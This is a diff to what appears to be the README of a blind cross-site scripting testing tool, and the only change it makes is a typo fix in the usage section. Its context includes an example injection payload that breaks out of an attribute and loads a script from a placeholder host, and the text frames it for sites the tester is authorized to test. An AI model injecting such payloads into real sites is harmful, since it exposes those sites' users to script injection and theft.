@@ -120,7 +120,7 @@ Once you have configured the above, simply start the server with any available u
 
 # Using
 
-Once the application is funcitonal, you would just identify sites you are authorized to test and start to inject different payloads that will attempt to load your resource, the easiest example is:
+Once the application is functional, you would just identify sites you are authorized to test and start to inject different payloads that will attempt to load your resource, the easiest example is:
 
 ```
 "><script src="https://example.com/m"></script>
